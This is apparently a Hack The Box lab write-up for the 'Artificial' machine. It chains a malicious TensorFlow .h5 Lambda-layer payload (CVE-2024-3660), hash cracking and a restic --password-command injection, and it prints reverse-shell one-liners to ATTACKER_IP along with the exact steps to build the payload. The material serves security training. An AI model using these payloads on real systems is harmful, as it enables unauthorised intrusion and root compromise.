# HTB Artificial — Full Writeup

**Platform:** Hack The Box
**Difficulty:** Easy
**OS:** Linux
**CVE:** CVE-2024-3660

---

## Overview

Artificial is an easy Linux machine that hosts a web application allowing users to upload and run TensorFlow AI models. The application uses a vulnerable version of TensorFlow (2.13.1) susceptible to CVE-2024-3660, which allows arbitrary code execution during deserialization of Keras Lambda layers in `.h5` model files. After gaining a shell as the `app` user, lateral movement is achieved by cracking an MD5 password hash found in the application's SQLite database. Privilege escalation exploits the Backrest backup web UI running as root — a bcrypt hash extracted from a backup archive grants admin access, and restic's `--password-command` flag is abused to execute a reverse shell as root.

**Full chain:**
```
Malicious TensorFlow .h5 model upload (CVE-2024-3660)
  -> RCE as app user via Keras Lambda deserialization
    -> SQLite DB credential extraction + MD5 crack (pivot to gael)
      -> SSH tunnel to Backrest Web UI (localhost:9898)
        -> Backup archive extraction + bcrypt crack (backrest_root)
          -> Restic --password-command injection (root)
```

---

## Reconnaissance

### Open Ports

```bash
nmap -sC -sV -oN nmap/results.md 10.129.232.51
```

* **22/tcp**: SSH — OpenSSH 8.2p1 Ubuntu
* **80/tcp**: HTTP — nginx 1.18.0, "Artificial - AI Solutions"

### DNS

```bash
echo "10.129.232.51 artificial.htb" | sudo tee -a /etc/hosts
```

### Directory Enumeration

```bash
gobuster dir -u http://artificial.htb -w /usr/share/seclists/Discovery/Web-Content/common.txt
```

Discovered endpoints:
* `/login` — Login form
* `/register` — User registration
* `/dashboard` — Model upload interface (authenticated)
* `/logout` — Session logout

### Web Application

After registering and logging in, the dashboard allows uploading `.h5` TensorFlow model files and running predictions against them. A linked `requirements.txt` reveals the dependency: `tensorflow-cpu==2.13.1`. A Dockerfile is also provided for building a compatible environment.

---

## Initial Access

### CVE-2024-3660 — TensorFlow Keras Lambda Deserialization RCE

TensorFlow 2.13.1 is vulnerable to CVE-2024-3660: when the application calls `tf.keras.models.load_model()` on an uploaded `.h5` file, any Python code embedded in a Keras `Lambda` layer is executed during deserialization.

### Building the Environment

A Docker container with Python 3.8 and the exact TensorFlow version is needed to generate compatible models:

```bash
# Dockerfile
FROM python:3.8-slim
WORKDIR /code
RUN apt-get update && apt-get install -y curl && \
    curl -k -LO https://files.pythonhosted.org/packages/65/ad/4e090ca3b4de53404df9d1247c8a371346737862cfe539e7516fd23149a4/tensorflow_cpu-2.13.1-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl && \
    rm -rf /var/lib/apt/lists/*
RUN pip install ./tensorflow_cpu-2.13.1-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl
ENTRYPOINT ["/bin/bash"]
```

```bash
sudo docker build -t artificial-exploit .
```

### Crafting the Malicious Model

The `import os` statement must be **inside** the function — Keras only serializes the function body, so top-level imports won't survive deserialization on the target.

```python
import tensorflow as tf

def exploit(x):
    import os
    os.system("bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/9001 0>&1'")
    return x

model = tf.keras.Sequential()
model.add(tf.keras.layers.Input(shape=(1,)))
model.add(tf.keras.layers.Lambda(exploit))
model.compile()
model.save("/code/exploit.h5")
```

> **Important:** When generating the model, your netcat listener must be **OFF**. TensorFlow executes Lambda layer code during `model.compile()` / `model.save()` to infer output shapes. If your listener is running, your local Docker container will connect back to it instead of the target — and you'll end up enumerating your own container.

```bash
# Listener OFF, then generate:
sudo docker run --rm -v $(pwd):/code artificial-exploit -c "cd /code && python3 make_model.py"

# NOW start the listener:
nc -lvnp 9001
```

### Getting the Shell

Upload the `.h5` file through the dashboard and click **View Predictions**. The target deserializes the model, executes the Lambda payload, and connects back.

```
connect to [ATTACKER_IP] from (UNKNOWN) [10.129.232.51] 42936
bash: cannot set terminal process group (830): Inappropriate ioctl for device
bash: no job control in this shell
bash-5.0$
```

Shell received as the `app` user.

---

## Privilege Escalation

### Step 1: Credential Extraction (app → gael)

Enumerate the web application directory to find the SQLite database:

```bash
find / -name "*.db" 2>/dev/null
# /home/app/app/instance/users.db
```

```bash
sqlite3 /home/app/app/instance/users.db "SELECT * FROM user;"
```

```
1|gael|gael@artificial.htb|c99175974b6e192936d97224638a34f8
2|mark|mark@artificial.htb|0f3d8c76530022670f1c6029eed09ccb
...
```

Crack the MD5 hash for `gael`:

```bash
hashcat -m 0 c99175974b6e192936d97224638a34f8 /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt
```

* Cracked: **`mattp005numbertwo`**

```bash
ssh gael@artificial.htb
# Password: mattp005numbertwo
cat ~/user.txt
```

### Step 2: Discovering Backrest (gael → root)

Enumerate listening services:

```bash
ss -tlnp
# LISTEN 0 4096 127.0.0.1:9898 0.0.0.0:*
```

Port 9898 is running the **Backrest** web UI (a web frontend for the `restic` backup tool). Forward the port to access it:

```bash
ssh -L 9898:127.0.0.1:9898 -N gael@artificial.htb
```

### Step 3: Extracting Backrest Credentials

The `gael` user is in the `sysadm` group, which grants read access to a backup archive:

```bash
ls -la /var/backups/
# -rw-r----- 1 root sysadm 52357120 ... backrest_backup.tar.gz
```

```bash
tar -xf /var/backups/backrest_backup.tar.gz -C /tmp
cat /tmp/backrest/.config/backrest/config.json
```

```json
{
  "auth": {
    "users": [{
      "name": "backrest_root",
      "passwordBcrypt": "JDJhJDEwJGNWR0l5OVZNWFFkMGdNNWdpbkNtamVpMmtaUi9BQ01Na1Nzc3BiUnV0WVA1OEVCWnovMFFP"
    }]
  }
}
```

Decode and crack the bcrypt hash:

```bash
echo -n "JDJhJDEwJGNWR0l5OVZNWFFkMGdNNWdpbkNtamVpMmtaUi9BQ01Na1Nzc3BiUnV0WVA1OEVCWnovMFFP" | base64 -d > bcrypt_hash
# $2a$10$cVGIy9VMXQd0gM5ginCmjei2kZR/ACMMkSsspbRutYP58EBZz/0QO

hashcat -m 3200 bcrypt_hash /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt
```

* Cracked: **`!@#$%^`**

### Step 4: Restic Command Injection

Log into Backrest at `http://127.0.0.1:9898` with `backrest_root` / `!@#$%^`.

Backrest executes `restic` commands as root. The `restic` utility accepts a `--password-command` flag that runs an arbitrary command and uses its output as the repository password. By injecting this flag when creating a new repository, we can execute commands as root.

Create a reverse shell script on the target:

```bash
cat > /tmp/pwn.sh << 'EOF'
#!/bin/bash
bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/9002 0>&1'
EOF
chmod +x /tmp/pwn.sh
```

Start a listener:

```bash
nc -lvnp 9002
```

In the Backrest UI, add a new Repository with the following flag:

```
--password-command /tmp/pwn.sh
```

When Backrest attempts to initialize the repository, it runs `restic init` with the injected flag, executing the reverse shell as root.

```
connect to [ATTACKER_IP] from (UNKNOWN) [10.129.232.51] 60808
root@artificial:/# id
uid=0(root) gid=0(root) groups=0(root)
```

---

## Flags

| Flag | Location |
|------|----------|
| user.txt | `/home/gael/user.txt` |
| root.txt | `/root/root.txt` |

---

## Tools Used

| Tool | Purpose |
|------|---------|
| nmap | Port scanning and service enumeration |
| gobuster | Directory brute-forcing |
| Docker | Building TensorFlow environment for exploit generation |
| TensorFlow/Keras | Crafting malicious .h5 model with Lambda RCE |
| sqlite3 | Extracting credentials from web app database |
| hashcat | Cracking MD5 and bcrypt hashes |
| netcat (nc) | Reverse shell listeners |
| SSH | Lateral movement and port forwarding |
| Backrest/restic | Exploited for privilege escalation via command injection |

---

## Key Takeaways

- **Understand your exploit's execution model** — TensorFlow executes Lambda layer code during both model saving *and* loading. If your listener is running while generating the malicious model locally, you'll catch a shell from your own build container instead of the target. Always generate the payload with the listener off.

- **Imports inside serialized functions** — When Keras serializes a Lambda layer, only the function body is preserved. Top-level `import` statements are lost during deserialization. Always place imports inside the function to ensure they survive the round-trip.

- **Check group memberships for lateral access** — The `gael` user wasn't root and had no sudo, but membership in the `sysadm` group granted read access to a backup archive containing admin credentials. Always run `id` and check what groups provide.

- **Backup tools run as root are high-value targets** — Backrest/restic ran as root to access all files for backup. Features like `--password-command` that execute arbitrary commands inherit that privilege, turning a backup admin into full system compromise.

- **Base64-encoded hashes are not encrypted** — The Backrest config stored a bcrypt hash behind Base64 encoding, which provides zero additional security. Always check for encoding layers before attempting to crack.

- **Port forwarding reveals hidden attack surface** — The Backrest UI was only listening on localhost:9898, invisible to external scans. SSH tunneling is essential for accessing internal services after gaining a foothold.
